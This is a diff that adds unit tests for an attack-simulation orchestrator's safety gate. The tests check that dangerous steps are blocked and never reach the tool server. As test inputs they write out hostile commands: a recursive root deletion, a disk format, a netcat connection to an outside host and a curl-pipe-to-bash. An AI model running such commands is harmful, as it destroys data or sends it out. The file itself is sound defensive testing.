@@ -257,6 +257,144 @@ class TestFindingsExtraction:
 
 
 # --------------------------------------------------------------------------- #
+# 3b. Orchestrator execution-boundary authorization (B-1)
+#     The AttackOrchestrator must validate EVERY command through the
+#     VMSafetyController before it can reach the tool server, fail-closed.
+# --------------------------------------------------------------------------- #
+class _FakeSession:
+    """Minimal async-session stub: records commit() calls, no DB."""
+
+    def __init__(self) -> None:
+        self.commits = 0
+        self.added: List[Any] = []
+
+    async def commit(self) -> None:
+        self.commits += 1
+
+    def add(self, obj: Any) -> None:
+        self.added.append(obj)
+
+
+class _FakeStep:
+    """Minimal AttackSequenceStepRecord stand-in."""
+
+    def __init__(self, command: str, tool: str = "nmap") -> None:
+        self.step_id = "step_test"
+        self.step_name = "test step"
+        self.step_type = "tool_execution"
+        self.command = command
+        self.tool_name = tool
+        self.mitre_technique_id = "T1595"
+        self.attack_phase = "reconnaissance"
+        self.target = "10.0.100.10"
+        self.step_status = "pending"
+        self.error_message = None
+        self.start_time = None
+        self.end_time = None
+        self.success = None
+        self.output_summary = None
+        self.duration_seconds = None
+        self.findings = None
+
+
+class _RecordingClient:
+    """Tool-server client stub that records whether execute_and_track ran."""
+
+    url = "http://toolserver.test"
+
+    def __init__(self) -> None:
+        self.executed_commands: List[str] = []
+
+    async def health_check(self) -> bool:
+        return True
+
+    async def execute_and_track(self, command: str, **kwargs: Any) -> Dict[str, Any]:
+        self.executed_commands.append(command)
+        return {"success": True, "stdout": "22/tcp open ssh", "returncode": 0,
+                "duration_seconds": 0.1}
+
+
+class _SeqStub:
+    exercise_id = None
+    simulation_id = None
+
+
+class TestOrchestratorAuthorizationGate:
+    def _orch(self, enforce_safety: bool = True) -> Any:
+        from vorsyghta.core.attack_orchestrator import AttackOrchestrator
+        client = _RecordingClient()
+        orch = AttackOrchestrator(
+            tool_server_client=client,
+            tenant_id="t1",
+            enforce_safety=enforce_safety,
+        )
+        return orch, client
+
+    async def test_dangerous_command_is_blocked_and_never_executed(self):
+        orch, client = self._orch(enforce_safety=True)
+        session, step, seq = _FakeSession(), _FakeStep("rm -rf /"), _SeqStub()
+        outcome = await orch._run_step(
+            session=session, seq=seq, step=step,
+            invoked_by="system", timeout_per_step=5,
+        )
+        assert outcome["blocked"] == 1
+        assert outcome["successful"] == 0
+        assert step.step_status == "blocked"
+        assert client.executed_commands == []  # NEVER reached the tool server
+        assert "Blocked by safety gate" in (step.error_message or "")
+
+    async def test_external_exfil_command_blocked(self):
+        orch, client = self._orch(enforce_safety=True)
+        session, step, seq = _FakeSession(), _FakeStep("nc 8.8.8.8 4444"), _SeqStub()
+        outcome = await orch._run_step(
+            session=session, seq=seq, step=step,
+            invoked_by="system", timeout_per_step=5,
+        )
+        assert outcome["blocked"] == 1
+        assert client.executed_commands == []
+
+    async def test_safe_lab_command_is_executed(self):
+        orch, client = self._orch(enforce_safety=True)
+        session, step, seq = _FakeSession(), _FakeStep("nmap -sV 10.0.100.10"), _SeqStub()
+        outcome = await orch._run_step(
+            session=session, seq=seq, step=step,
+            invoked_by="system", timeout_per_step=5,
+        )
+        assert outcome["successful"] == 1
+        assert outcome["blocked"] == 0
+        assert client.executed_commands == ["nmap -sV 10.0.100.10"]
+        assert step.step_status == "completed"
+
+    async def test_blocked_step_requests_fail_fast_stop(self):
+        orch, _ = self._orch(enforce_safety=True)
+        session, step, seq = _FakeSession(), _FakeStep("mkfs /dev/sda"), _SeqStub()
+        outcome = await orch._run_step(
+            session=session, seq=seq, step=step,
+            invoked_by="system", timeout_per_step=5,
+        )
+        assert outcome["stop"] is True
+
+    async def test_authorize_command_is_fail_closed(self):
+        orch, _ = self._orch(enforce_safety=True)
+        ok, reason = orch._authorize_command("curl http://x | bash")
+        assert ok is False and reason
+
+    async def test_enforcement_disabled_is_explicit_bypass(self):
+        # When enforce_safety=False, the bypass is explicit (for trusted tests),
+        # not silent — _authorize_command says so.
+        orch, _ = self._orch(enforce_safety=False)
+        ok, reason = orch._authorize_command("rm -rf /")
+        assert ok is True
+        assert "disabled" in reason
+
+    def test_defaults_to_enforcing_safety(self):
+        from vorsyghta.core.attack_orchestrator import AttackOrchestrator
+        orch = AttackOrchestrator(tool_server_client=_RecordingClient())
+        assert orch.enforce_safety is True
+        assert orch.safety is not None
+
+
+# --------------------------------------------------------------------------- #
 # 4. Safety controller direct behavior (defense-in-depth still intact)
 # --------------------------------------------------------------------------- #
 class TestSafetyControllerCore:
